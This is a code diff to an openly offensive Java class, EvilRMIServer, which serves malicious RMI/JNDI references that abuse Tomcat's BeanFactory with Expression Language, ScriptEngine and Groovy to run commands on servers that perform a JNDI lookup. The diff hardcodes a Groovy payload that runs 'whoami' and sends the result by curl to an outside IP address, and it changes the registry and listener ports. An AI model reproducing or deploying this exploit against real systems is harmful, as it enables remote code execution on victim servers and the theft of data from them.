@@ -2,6 +2,7 @@ package payloads;
 
 import com.sun.jndi.rmi.registry.*;
 
+import java.net.Inet4Address;
 import java.rmi.RemoteException;
 import java.rmi.registry.*;
 import javax.naming.*;
@@ -10,10 +11,9 @@ import org.apache.naming.ResourceRef;
 
 public class EvilRMIServer {
 
-    public CommandGenerator commandGenerator;
 
     public EvilRMIServer(Listener listener){
-        commandGenerator = new CommandGenerator(listener);
+
     }
 
     /*
@@ -26,7 +26,7 @@ public class EvilRMIServer {
                 "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                         "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                         ")",
-                commandGenerator.getBase64CommandTpl()
+                ""
         )));
         return new ReferenceWrapper(ref);
     }
@@ -37,8 +37,14 @@ public class EvilRMIServer {
     public ReferenceWrapper execByGroovy() throws RemoteException, NamingException{
         ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
         ref.add(new StringRefAddr("forceString", "x=evaluate"));
-        String script = String.format("'%s'.execute()", commandGenerator.getBase64CommandTpl());
+        //String script = String.format("'%s'.execute()", commandGenerator.getBase64CommandTpl());
+
+        String cmd = "curl 18.162.60.133:443/proc.text";
+        String script = String.format("'%s'.execute()", cmd);
+        script = "def a = 'whoami'.execute().text;def b = 'curl 18.162.60.133:443/'+a;b.execute()";
+        System.out.println(script);
         ref.add(new StringRefAddr("x",script));
+        System.out.println(new StringRefAddr("x",script));
         return new ReferenceWrapper(ref);
     }
 
@@ -50,11 +56,11 @@ public class EvilRMIServer {
 
     public static void main(String[] args) throws Exception{
 
-        System.out.println("Creating evil RMI registry on port 1097");
-        Registry registry = LocateRegistry.createRegistry(1097);
+        System.out.println("Creating evil RMI registry on port 8080");
+        Registry registry = LocateRegistry.createRegistry(8080);
         String ip = args[0];
         System.out.println(ip);
-        EvilRMIServer evilRMIServer = new EvilRMIServer(new Listener(ip,5555));
+        EvilRMIServer evilRMIServer = new EvilRMIServer(new Listener(ip,7777));
         System.setProperty("java.rmi.server.hostname",ip);
 
         registry.bind("ExecByEL",evilRMIServer.execByEL());
